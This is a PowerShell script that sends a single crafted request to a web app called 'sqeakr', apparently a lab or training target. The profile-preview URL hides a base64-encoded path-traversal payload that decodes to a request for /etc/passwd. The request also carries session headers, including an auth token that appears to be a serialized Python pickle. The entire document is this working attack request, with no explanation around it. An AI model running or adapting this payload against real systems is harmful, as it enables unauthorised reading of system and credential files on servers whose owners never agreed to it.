$method = [Microsoft.PowerShell.Commands.WebRequestMethod]::"GET"
$URI = [System.Uri]::new("http://sqeakr:80/api/profile/preview/Li4vLi4vLi4vLi4vLi4vLi9ldGMvcGFzc3dk")
$maximumRedirection = [System.Int32] 0
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "sqeakr")
$userAgent = [System.String]::new("Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
$headers.Add("Accept", "application/json, text/plain, */*")
$headers.Add("Accept-Language", "en-US,en;q=0.5")
$headers.Add("Accept-Encoding", "gzip, deflate")
$headers.Add("authtoken", "gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADMxZGE4YmExLWNlMGEtNDVmZC05YzcyLTU1NDc3YTFkM2Y2OHEDdS4i")
$headers.Add("Referer", "http://sqeakr/profile/preview/")
$webSession = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$webSession.Cookies.Add($URI, [System.Net.Cookie]::new("csrftoken", "BCw6hLwl8fk9cjI1TAMUfTrxNKKg1uggGGtGbEqTxQcC2H8eNKvvh13jUsuwyxqb"))
$response = (Invoke-WebRequest -Method $method -Uri $URI -MaximumRedirection $maximumRedirection -Headers $headers -UserAgent $userAgent -WebSession $webSession)
$response

